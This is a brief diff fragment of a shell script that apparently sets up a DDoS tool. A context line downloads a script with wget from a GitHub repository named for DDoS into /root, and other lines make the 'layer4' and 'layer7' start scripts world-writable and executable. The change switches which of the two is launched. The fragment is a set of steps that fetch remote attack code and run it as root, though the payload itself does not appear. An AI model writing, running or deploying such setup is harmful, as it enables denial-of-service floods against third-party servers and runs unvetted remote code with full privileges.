@@ -29,7 +29,7 @@ wget -O /root/start_layer7.sh https://raw.githubusercontent.com/sania-owner/DDoS
 chmod 0777 /root/start_layer4.sh
 chmod 0777 /root/start_layer7.sh
 
-cd /root; ./start_layer4.sh "&"
+cd /root; ./start_layer7.sh "&"
 
 
 
